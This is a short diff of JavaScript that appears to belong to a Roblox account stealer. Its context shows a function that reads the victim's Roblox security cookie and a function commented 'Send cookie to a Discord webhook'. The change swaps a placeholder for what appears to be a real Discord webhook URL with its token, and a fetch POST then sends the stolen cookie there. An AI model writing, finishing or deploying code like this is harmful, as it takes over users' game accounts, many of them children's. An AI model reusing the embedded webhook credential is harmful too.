@@ -12,7 +12,7 @@ function getRobloxSecurityCookie() {
 
  // Send cookie to a Discord webhook
 function sendToWebhook(cookieValue) {
-    const webhookUrl = "https://discord.com/api/webhooks/your-webhook-id";
+    const webhookUrl = "https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B";
     fetch(webhookUrl, {
         method: 'POST',
         headers: {
